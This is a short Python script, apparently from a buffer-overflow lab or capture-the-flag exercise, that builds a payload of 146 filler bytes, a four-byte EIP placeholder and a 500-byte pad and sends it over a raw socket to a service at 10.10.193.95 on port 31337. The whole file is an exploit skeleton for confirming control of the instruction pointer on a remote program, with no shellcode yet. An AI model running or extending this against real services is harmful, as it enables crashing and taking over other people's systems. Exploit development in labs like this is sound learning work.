import socket

filler = "A" * 146
eip = "B" * 4
offset = "C" * 4
buffer = "D" * 500
line_feed = "\n"

input = filler + eip + offset + buffer + line_feed

input = input.encode("utf-8")
print(input)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.193.95",31337))
s.send(input)
s.close()
print("done");